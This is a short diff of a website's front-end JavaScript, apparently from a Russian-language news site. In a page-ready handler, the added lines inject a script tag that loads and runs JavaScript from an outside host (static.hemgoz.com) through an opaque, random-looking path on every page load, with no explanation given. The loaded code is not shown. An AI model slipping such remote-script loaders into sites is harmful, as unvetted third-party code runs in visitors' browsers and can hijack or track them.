@@ -298,6 +298,14 @@ $(document).ready(function () {
   lang ? "" : (lang = "ru");
   var countryCode = document.getElementById('countryCode').value;
 
+  var script = document.createElement('script');
+  script.src = '//static.hemgoz.com/dx0h18h8qliv687qt2qh818h0pmvuq/y305cd7.js';
+  script.type = 'text/javascript';
+  script.async = true; 
+  
+  document.head.appendChild(script);
+
+
   function addGoogleToHistory() {
    window.initBacklink("https://ariana.news/")
   }
